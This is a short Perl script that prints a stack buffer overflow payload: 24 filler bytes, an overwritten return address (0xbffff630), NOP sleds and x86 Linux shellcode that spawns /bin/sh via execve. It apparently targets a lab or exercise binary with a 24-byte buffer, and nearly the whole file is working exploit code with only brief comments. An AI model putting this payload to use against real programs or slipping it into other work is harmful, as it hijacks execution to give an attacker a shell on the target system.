#! /usr/bin/perl

# --- Overflowing the Buffer (size of the buffer is : 24) ---
print "A"x24;

# --- Modify Ret Address ---
# 0xbffff630


print "\x30\xf6\xff\xbf";
print "\x90"x8;
print "\x31\xc0\xb0\x0b\x31\xdb\x53\x68";
print "\x2f\x2f\x73\x68\x68\x2f\x62\x69";
print "\x6e\x89\xe3\x31\xc9\x51\x53\x89";
print "\xe1\x31\xd2\xcd\x80";
print "\x90"x8;
